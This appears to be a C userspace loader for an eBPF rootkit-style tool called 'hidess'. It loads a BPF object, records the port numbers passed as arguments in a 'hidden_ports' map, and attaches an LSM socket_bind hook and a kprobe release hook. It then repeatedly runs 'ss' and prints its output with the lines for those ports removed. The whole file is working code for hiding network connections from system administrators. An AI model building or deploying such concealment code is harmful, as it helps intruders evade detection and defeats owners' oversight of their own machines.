#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <stdint.h>
#include <errno.h>
#include <sys/resource.h>
#include <bpf/libbpf.h>
#include <bpf/bpf.h>
#include "hidess.h"

#define MAX_PORTS 1024

static int hidden_ports_map_fd = -1;
static volatile bool exiting = false;

static void sigint_handler(int sig) {
    (void)sig;
    exiting = true;
}

static int is_port_hidden(uint16_t port) {
    uint8_t value = 0;
    int ret = bpf_map_lookup_elem(hidden_ports_map_fd, &port, &value);
    if (ret == 0)
        return value != 0;
    /* treat errors as not hidden */
    return 0;
}

int main(int argc, char **argv) {
    struct bpf_object *obj = NULL;
    struct bpf_program *prog = NULL;
    struct bpf_map *hidden_ports_map = NULL;
    struct bpf_link *bind_link = NULL;
    struct bpf_link *release_link = NULL;
    int err;
    uint16_t port_to_hide;

    if (argc < 2) {
        fprintf(stderr, "Usage: %s <port1> [port2...]\n", argv[0]);
        return 1;
    }

    /* bump RLIMIT_MEMLOCK so libbpf can lock sufficient memory */
    struct rlimit rl = { RLIM_INFINITY, RLIM_INFINITY };
    if (setrlimit(RLIMIT_MEMLOCK, &rl)) {
        perror("setrlimit(RLIMIT_MEMLOCK)");
        fprintf(stderr, "Warning: failed to raise RLIMIT_MEMLOCK, continue might fail\n");
    }

    signal(SIGINT, sigint_handler);
    signal(SIGTERM, sigint_handler);

    /* open BPF object */
    obj = bpf_object__open_file("hidess.o", NULL);
    if (!obj) {
        fprintf(stderr, "ERROR: bpf_object__open_file failed\n");
        return 1;
    }

    /* load (verify + load into kernel) */
    err = bpf_object__load(obj);
    if (err) {
        fprintf(stderr, "ERROR: bpf_object__load failed: %d\n", err);
        bpf_object__close(obj);
        return 1;
    }

    /* find the map fd */
    hidden_ports_map = bpf_object__find_map_by_name(obj, "hidden_ports");
    if (!hidden_ports_map) {
        fprintf(stderr, "ERROR: hidden_ports map not found in object\n");
        bpf_object__close(obj);
        return 1;
    }
    hidden_ports_map_fd = bpf_map__fd(hidden_ports_map);
    if (hidden_ports_map_fd < 0) {
        fprintf(stderr, "ERROR: failed to get fd for hidden_ports map\n");
        bpf_object__close(obj);
        return 1;
    }

    /* populate the map with ports to hide */
    for (int i = 1; i < argc; i++) {
        long v = strtol(argv[i], NULL, 10);
        if (v <= 0 || v > 0xFFFF) {
            fprintf(stderr, "Skipping invalid port: %s\n", argv[i]);
            continue;
        }
        port_to_hide = (uint16_t)v;
        uint8_t value = 1;
        err = bpf_map_update_elem(hidden_ports_map_fd, &port_to_hide, &value, BPF_ANY);
        if (err) {
            fprintf(stderr, "WARNING: failed to update hidden_ports map for port %u: %s\n",
                    port_to_hide, strerror(errno));
        } else {
            printf("Added port %u to hidden_ports map\n", port_to_hide);
        }
    }

    /* attach LSM socket_bind (best-effort, warned if missing) */
    prog = bpf_object__find_program_by_name(obj, "socket_bind_hook");
    if (!prog) {
        fprintf(stderr, "Warning: socket_bind_hook not found in object\n");
    } else {
        bind_link = bpf_program__attach(prog);
        if (libbpf_get_error(bind_link)) {
            long rc = libbpf_get_error(bind_link);
            fprintf(stderr, "Warning: failed to attach socket_bind_hook: %ld\n", rc);
            bind_link = NULL;
        } else {
            printf("Attached socket_bind_hook (LSM)\n");
        }
    }

    /* attach optional kprobe / release handler (best-effort) */
    prog = bpf_object__find_program_by_name(obj, "handle_tcp_close");
    if (!prog) {
        /* maybe the section is named differently; try socket_release_hook as fallback */
        prog = bpf_object__find_program_by_name(obj, "socket_release_hook");
    }

    if (!prog) {
        fprintf(stderr, "Note: no kprobe release handler found in object (ok)\n");
    } else {
        release_link = bpf_program__attach(prog);
        if (libbpf_get_error(release_link)) {
            long rc = libbpf_get_error(release_link);
            fprintf(stderr, "Warning: failed to attach release/kprobe hook: %ld\n", rc);
            release_link = NULL;
        } else {
            printf("Attached kprobe/release hook\n");
        }
    }

    /* at this point we don't abort on the optional attach failures */
    //printf("BPF programs loaded. Running ss and filtering results (Ctrl+C to stop)...\n");

    /* stream and filter ss output until sigint */
    while (!exiting) {
        FILE *ss_output = popen("ss -a -n -p", "r");
        if (!ss_output) {
            perror("popen(ss)");
            break;
        }

        char line[1024];
        while (fgets(line, sizeof(line), ss_output) != NULL) {
            uint16_t port = 0;
            char *port_start = strrchr(line, ':');
            if (port_start && (sscanf(port_start + 1, "%hu", &port) == 1)) {
                if (!is_port_hidden(port)) {
                    fputs(line, stdout);
                }
            } else {
                fputs(line, stdout);
            }
        }
        pclose(ss_output);

        /* sleep a bit to avoid tight loop; also allow Ctrl+C to work */
        for (int i = 0; i < 10 && !exiting; i++) {
            usleep(100000);
        }
    }

    printf("Exiting, cleaning up...\n");

    if (release_link) {
        bpf_link__destroy(release_link);
    }
    if (bind_link) {
        bpf_link__destroy(bind_link);
    }
  
    bpf_object__close(obj);

    return 0;
}
